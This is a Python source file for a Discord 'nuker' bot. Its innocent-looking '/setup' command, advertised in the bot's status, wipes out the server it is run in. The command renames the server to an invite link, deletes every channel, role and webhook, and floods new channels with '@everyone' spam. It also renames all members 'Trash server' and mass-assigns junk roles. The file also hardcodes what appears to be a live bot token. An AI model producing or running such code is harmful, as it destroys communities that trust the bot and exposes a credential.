import discord
from discord.ext import commands
from discord import app_commands
import asyncio
intents = discord.Intents.default()
intents.bans = True
intents.message_content = True
intents.members = True
activity = discord.Activity(name=f"/setup | Currently in 198 servers", type=discord.ActivityType.listening)
bot = commands.Bot(command_prefix="$", intents=discord.Intents.all())
@bot.event
async def on_ready():
    print(f"{bot.user} is online")
    await bot.change_presence(activity=activity)
    await bot.tree.sync()
@bot.tree.command(name="ping")
async def ping(interaction: discord.Interaction):
    """Request the bots ping"""
    await interaction.response.send_message(f"Pong! {round(bot.latency * 1000)}ms")
@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    """Setup the bot"""
    global guild
    guild = interaction.guild
    global role
    await interaction.guild.edit(name=".gg/yQTVBpbVf3", description=".gg/yQTVBpbVf3", icon=None)
    await asyncio.gather(
        deletechs(),
        deletechs(),
        deletechs(),
        spamchannels(),
        spamchannels(),
        spamchannels(),
        renameusers(),
        createroles(),
        createwebhook(),
        removeroles(),
        deletewebhooks()
    )
async def spamchannels():
    for i in range(20):
        global channel
        channel = await guild.create_text_channel(name=f"﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅ ({i})")
        for j in range(3):
            await channel.send(f"Server nuked @everyone﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙{i}⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅e﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅﷽𒐫𒈙⸻꧅")
async def deletechs():
    channels = guild.channels
    for channel in channels:
        await channel.delete()
async def renameusers():
    members = guild.members
    for user in members:
        await user.edit(nick="Trash server")
async def createroles():
    try:
        for n in range(20):
            role = await guild.create_role(name=f"Trash server﷽𒐫𒈙⸻꧅﷽ {n}")
            for user in guild.members:
                await user.add_roles(role)
    except Exception as err:
        print(err)
async def deletewebhooks():
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
async def createwebhook():
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.create_webhook(name="Trash server")
async def removeroles():
    roles = guild.roles
    for role in roles:
        await role.delete()
bot.run("MTEwNTUxMDI0MDg5Nzc0OTE4Mg.Gk1_z8.X_SP4sGZ1-tmqbLfYbSFFBfZTrMHAVx5jXOXms")